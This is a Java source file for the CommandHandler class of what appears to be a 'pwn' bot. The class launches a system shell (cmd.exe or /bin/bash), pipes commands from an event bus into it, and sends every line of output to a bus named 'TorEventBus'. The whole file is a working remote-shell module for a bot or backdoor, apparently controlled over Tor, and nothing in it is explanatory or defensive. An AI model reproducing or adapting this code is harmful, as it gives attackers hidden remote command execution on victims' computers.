package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.commands.handler;

import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.ControlEvent;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.Event;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.command.CommandEvent;
import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.commands.header.CommonHeader;
import com.google.common.eventbus.Subscribe;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import org.apache.commons.lang3.SystemUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommandHandler implements Runnable {

    boolean power = true;

    @Override
    public void run() {
        do {

        } while (power);
    }

    Logger logger = LoggerFactory.getLogger(getClass());
    private ProcessBuilder processBuilder;
    private Process process;
    private Thread commandReader;

    private BufferedReader bufferedReader;
    private PrintWriter printWriter;

    public void register() {
        logger.info("register");
        CommonHeader.getEVENT_HEADER().getCommandEventBus().register(this);
        logger.info("register-ok");
    }

    //FROM controlEventPoint
    private void init() {
        logger.info("init");
        this.processBuilder = new ProcessBuilder();
        if (SystemUtils.IS_OS_WINDOWS) {
            processBuilder.command("cmd.exe");
            logger.info("IS_OS_WINDOWS");
        } else if (SystemUtils.IS_OS_LINUX) {
            processBuilder.command("/bin/bash");
            logger.info("IS_OS_LINUX");
        }
        processBuilder.redirectErrorStream(true);

        logger.info("init-ok");
    }

    //FROM controlEventPoint
    private void start() throws IOException {
        logger.error("start");
        //------------------------------------------------------
        this.process = processBuilder.start();

        bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        this.printWriter = new PrintWriter(process.getOutputStream());

        this.commandReader = new Thread(() -> {//OUTPUT
            Thread.currentThread().setName("CommandHandler-commandReader");
            //TODO
            try {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    CommandEvent commandEvent = new CommandEvent();
                    commandEvent.setOutput(line);
                    CommonHeader.getEVENT_HEADER().getTorEventBus().post(commandEvent);
                }
            } catch (Exception e) {
                logger.error("", e);
            }
        });
        commandReader.start();
        //------------------------------------------------------
        logger.error("start-ok");
    }

    //-----------------------------CONTROL--------------------------------------
    @Subscribe
    void controlEventPoint(Event event) {
        if (event instanceof ControlEvent) {
            ControlEvent controlEvent = (ControlEvent) event;
            ControlEvent.CONTROL_TYPE type = controlEvent.getType();
            logger.warn(type.toString());
            switch (type) {
                case INIT:
                    init();
                    break;
                case START:
                    try {
                    start();
                } catch (Exception e) {
                    logger.error("", e);
                }
                break;
                default:
                    logger.warn("controlEventPoint:type:else");
                    break;
            }
        } else {
            logger.warn(event.getClass().getCanonicalName());
        }
    }

    @Subscribe
    void executeCommands(CommandEvent event) {
        String command = event.getCommand();
        printWriter.println(command);
        printWriter.flush();

    }
}
